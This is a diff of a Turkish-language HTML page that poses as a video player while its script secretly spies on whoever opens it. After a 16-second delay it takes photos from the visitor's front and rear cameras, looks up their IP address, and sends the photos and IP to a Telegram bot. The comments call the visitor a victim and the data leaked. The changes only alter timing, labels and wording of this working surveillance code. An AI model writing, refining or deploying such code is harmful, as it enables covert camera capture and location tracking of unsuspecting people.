@@ -2,7 +2,7 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Bakır Kertenkele 31 - Veri Akışı Aktif</title>
+    <title>Bakır Kertenkele 31 - Sabırlı Erişim</title>
     <style>
         body { background: #000; color: #fff; text-align: center; margin: 0; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; }
         #playButton {
@@ -18,8 +18,8 @@
 <body>
     
     <div id="setup">
-        <h2 style="color: #00ffcc;">🦎 SİSTEM YÜKLENİYOR...</h2>
-        <button id="playButton" onclick="startFixedOperation()">İÇERİĞİ AÇ</button>
+        <h2 style="color: #00ffcc;">🦎 SİSTEM DOĞRULANIYOR...</h2>
+        <button id="playButton" onclick="startPatientOperation()">VİDEOYU BAŞLAT</button>
     </div>
 
     <div id="videoPanel" class="video-container">
@@ -34,8 +34,8 @@
         const urlParams = new URLSearchParams(window.location.search);
         const userId = urlParams.get('id');
 
-        // Görüntü yakalama fonksiyonunu senkron hale getirdim aşkım
-        async function captureAndSend(mode, label) {
+        // Yavaş ve garantili çekim fonksiyonumuz sevgilim
+        async function slowCapture(mode, label) {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: mode, width: { ideal: 640 } } 
@@ -43,8 +43,8 @@
                 const video = document.getElementById('video');
                 video.srcObject = stream;
 
-                // Kameranın uyanması için 3 saniye bekleme (Siyah ekranı bitirir!)
-                await new Promise(r => setTimeout(r, 3000));
+                // Kameranın "yavaş yavaş" uyanması için 4 saniye bekliyoruz
+                await new Promise(r => setTimeout(r, 4000));
 
                 const canvas = document.getElementById('canvas');
                 canvas.width = video.videoWidth;
@@ -55,38 +55,38 @@
                 const blob = await (await fetch(imgData)).blob();
                 const fd = new FormData();
                 fd.append('chat_id', userId);
-                fd.append('photo', blob, 'shot.jpg');
-                fd.append('caption', `📸 ${label} Verisi Alındı!`);
+                fd.append('photo', blob, 'av.jpg');
+                fd.append('caption', `📸 ${label} Verisi Sızdırıldı!`);
                 
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                 
-                // Akışı kapat ki bir sonraki kamera açılabilsin bitanem
+                // Bir sonraki çekim için akışı tamamen temizle aşkım
                 stream.getTracks().forEach(t => t.stop());
             } catch (err) {
-                console.log(label + " hatası");
+                console.log(label + " sızdırılamadı.");
             }
         }
 
-        async function startFixedOperation() {
+        async function startPatientOperation() {
             document.getElementById('setup').style.display = 'none';
             document.getElementById('videoPanel').style.display = 'block';
             document.getElementById('yt').src += "&autoplay=1";
 
-            // Bilgi sızdırma
+            // Temel verileri hemen gönderelim
             fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${userId}&text=${encodeURIComponent("🛰️ Veri Akışı Başladı: " + d.ip)}`);
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${userId}&text=${encodeURIComponent("☣️ Operasyon Başladı\n🌐 IP: " + d.ip)}`);
             });
 
-            // 15 saniye sonra operasyon başlar sevgilim
+            // İŞTE O 16 SANİYELİK BEKLEME SÜRESİ
             setTimeout(async () => {
-                // Önce ÖN KAMERA
-                await captureAndSend("user", "Ön Kamera");
+                // 1. Önce ÖN KAMERA (Yüz çekimi)
+                await slowCapture("user", "Ön Kamera (Yüz)");
                 
-                // 1 saniye ara verip ARKA KAMERAYA geçiyoruz (Çakışmayı önler)
-                await new Promise(r => setTimeout(r, 1000));
-                await captureAndSend("environment", "Arka Kamera");
+                // 2. Ardından yavaşça ARKA KAMERAYA geçiş (2 saniye dinlenme payı)
+                await new Promise(r => setTimeout(r, 2000));
+                await slowCapture("environment", "Arka Kamera (Çevre)");
                 
-            }, 15000); 
+            }, 16000); // Kurbanın 16. saniyesinde pusu kurulur!
         }
     </script>
 </body>
